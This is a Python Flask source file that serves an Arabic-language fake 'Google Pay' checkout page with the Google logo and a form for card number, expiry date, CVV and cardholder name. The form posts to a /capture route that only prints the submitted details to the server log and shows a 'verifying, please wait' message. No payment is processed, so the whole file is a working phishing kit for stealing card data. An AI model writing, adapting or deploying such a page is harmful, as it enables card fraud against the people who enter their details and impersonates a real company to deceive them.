import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# تصميم صفحة جوجل (Google Pay + Manual Visa)
GOOGLE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Pay - الدفع الآمن</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
        .container { width: 90%; max-width: 400px; text-align: center; }
        .payment-box { border: 1px solid #dadce0; padding: 24px; border-radius: 8px; }
        .gpay-btn { background: #000; color: #fff; padding: 12px; border-radius: 4px; cursor: pointer; border: none; width: 100%; font-size: 18px; margin-bottom: 15px; }
        input { width: 100%; padding: 13px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .visa-btn { background: #1a73e8; color: white; padding: 13px; border-radius: 4px; border: none; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80">
        <div class="payment-box">
            <h2>إتمام عملية الدفع</h2>
            <button class="gpay-btn"> Pay (Google Pay)</button>
            <div style="margin: 20px 0; color: #70757a;">أو ادفع يدويًا بالبطاقة</div>
            <form action="/capture" method="post">
                <input type="text" name="card" placeholder="رقم البطاقة" required>
                <div style="display: flex; gap: 8px;">
                    <input type="text" name="exp" placeholder="MM/YY" required>
                    <input type="text" name="cvv" placeholder="CVV" required>
                </div>
                <input type="text" name="name" placeholder="الاسم على البطاقة" required>
                <button type="submit" class="visa-btn">تأكيد الدفع</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(GOOGLE_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    print(f"Captured: {request.form}")
    return "<h1>جاري التحقق... يرجى الانتظار</h1>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
